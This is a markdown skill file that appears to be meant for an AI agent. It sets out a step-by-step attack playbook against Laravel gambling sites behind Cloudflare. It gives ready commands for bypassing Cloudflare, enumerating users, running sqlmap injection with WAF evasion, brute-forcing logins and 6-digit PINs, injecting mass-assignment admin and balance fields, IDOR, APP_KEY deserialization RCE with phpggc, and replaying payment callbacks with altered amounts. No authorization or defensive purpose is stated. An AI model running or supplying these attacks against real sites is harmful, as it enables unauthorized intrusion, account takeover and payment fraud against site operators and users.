---
name: judol-attack-flow
description: "Full attack flow for judol (Indonesian gambling) sites — Laravel + Cloudflare. Recon → Enumerate → Exploit. Tools + endpoints + techniques."
tags: [judol, laravel, cloudflare, attack-flow, web-hunting, indonesia]
---

# Judol Attack Flow — Laravel + Cloudflare

## Tools Stack
- CF Bypass: FlareSolverr (docker 8191), Playwright+Stealth, cloudscraper
- Recon: subfinder, crt.sh, Shodan, SecurityTrails, Gau, waybackurls
- Fuzz: ffuf, nuclei
- Auth: hydra, custom PIN brute script
- SQLi: sqlmap (tools/web/sqlmap-dev/)
- Proxy: Burp Suite (manual)

## STEP 1: RECON (ALWAYS DO FIRST)

### 1a. CF Bypass + Page Analysis
```bash
# FlareSolverr
curl -s http://localhost:8191/v1 -X POST -H "Content-Type: application/json" \
  -d '{"cmd":"request.get","url":"https://TARGET","maxTimeout":60000}'

# Extract: forms, endpoints, JS files, Firebase config, CSRF tokens
# Save HTML → analyze inline scripts for API endpoints
```

### 1b. Subdomain Enumeration
```bash
subfinder -d TARGET -silent -o subdomains.txt
# Check crt.sh for SSL cert subdomains
curl -s "https://crt.sh/?q=%.TARGET&output=json" | jq -r '.[].name_value' | sort -u
```

### 1c. DNS History (Origin IP)
```bash
curl -s "https://api.hackertarget.com/hostsearch/?q=TARGET"
# SecurityTrails, ViewDNS for historical A records
```

### 1d. URL Discovery
```bash
# Wayback Machine
curl -s "https://web.archive.org/cdx/search/cdx?url=TARGET/*&output=text&fl=original" | sort -u
```

### 1e. Port Scan (if origin IP found)
```bash
nmap -sV -p 21,22,80,443,3306,6379,8080,8443,9000 ORIGIN_IP
```

## STEP 2: ENUMERATE

### 2a. User Enumeration
```bash
# /checkExistingEmail — response size/time differs for valid users
ffuf -w emails.txt -u https://TARGET/checkExistingEmail \
  -X POST -d "email=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" \
  -fs BASELINE_SIZE -mc 200

# /checkExistingMobile
ffuf -w mobiles.txt -u https://TARGET/checkExistingMobile \
  -X POST -d "mobile=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"
```

### 2b. Hidden Endpoints
```bash
ffuf -w common.txt -u https://TARGET/FUZZ -fs BASELINE_SIZE -mc 200,301,302,403
# Look for: /env, /.env, /debug, /admin, /api, /telescope, /horizon
```

### 2c. S3 Bucket Enumeration
```bash
# If assets on files.sitestatic.net
# Check: https://TARGET.s3.amazonaws.com
# Check: https://files.sitestatic.net.s3.amazonaws.com
aws s3 ls s3://BUCKET_NAME --no-sign-request 2>/dev/null
```

### 2d. Laravel-Specific
```bash
# .env exposure
curl -s https://TARGET/.env
curl -s https://TARGET/env

# Debug endpoints
curl -s https://TARGET/telescope
curl -s https://TARGET/horizon
curl -s https://TARGET/_ignition/health-check

# Laravel log viewer
curl -s https://TARGET/log-viewer
```

## STEP 3: EXPLOIT

### 3a. SQLi
```bash
# Via FlareSolverr cookies
python3 tools/web/sqlmap-dev/sqlmap.py \
  -u "https://TARGET/checkExistingEmail?email=test@test.com" \
  --cookie="COOKIES_FROM_FLARESOLVERR" \
  --level=3 --risk=2 --batch

# POST-based
python3 tools/web/sqlmap-dev/sqlmap.py \
  -u "https://TARGET/login" --data="user_name=admin&password=test&_token=TOKEN" \
  --cookie="COOKIES" -p user_name --batch
```

### 3b. Login Brute Force
```bash
# Hydra
hydra -l admin -P passwords.txt TARGET https-post-form \
  "/login:user_name=^USER^&password=^PASS^&_token=TOKEN:H=Cookie: COOKIES:F=incorrect"

# ffuf (faster)
ffuf -w passwords.txt -u https://TARGET/login -X POST \
  -d "user_name=admin&password=FUZZ&_token=TOKEN" \
  -H "Cookie: COOKIES" -fc 401 -mc 200,302
```

### 3c. PIN Brute Force (6-digit)
```bash
# Generate: seq -w 000000 999999 > pins.txt
# Custom script with FlareSolverr cookies
# Target: /validate-pin
# Watch for rate limit + lockout
```

### 3d. Mass Assignment
```bash
# Register with extra fields
curl -X POST https://TARGET/register \
  -d "user_name=test&password=test&_token=TOKEN&is_admin=1&role=admin&balance=999999" \
  -b "COOKIES"
```

### 3e. IDOR
```bash
# Test with different user IDs
curl -X POST https://TARGET/getHKBLotteryResults \
  -d "_token=TOKEN&user_id=1234" -b "COOKIES"
# Change user_id to 1235, 1236...
```

### 3f. Laravel APP_KEY RCE
```bash
# If APP_KEY found in .env or logs
# CVE-2021-3129: Laravel < 8.x RCE via cookie deserialization
# Use: phpggc Laravel/RCE1 system "id" -b | base64
# Set as XSRF-TOKEN cookie value
```

### 3g. QRIS Payment Abuse
```bash
# If deposit uses QRIS auto
# Check callback endpoint for signature verification
# Try: replay callback with modified amount
# Try: callback without valid signature
```

## DECISION TREE
```
CF detected → FlareSolverr → Playwright → cloudscraper → pivot
Recon done → enumerate endpoints → test each
User enum found → brute force login
SQLi suspected → sqlmap
Mass assignment → inject fields
IDOR found → manipulate parameters
APP_KEY leaked → RCE via deserialization
```

## Pitfalls
- Always get fresh CSRF token before each request
- FlareSolverr cookies expire ~15min, re-solve if getting CF again
- Rate limit awareness: slow down after 100 requests
- judol sites often have WAF rules for UNION, SLEEP, etc — use tamper scripts
- Laravel catch-all returns 200 for everything — filter by response size
- PIN brute force triggers lockout after X attempts — watch for that
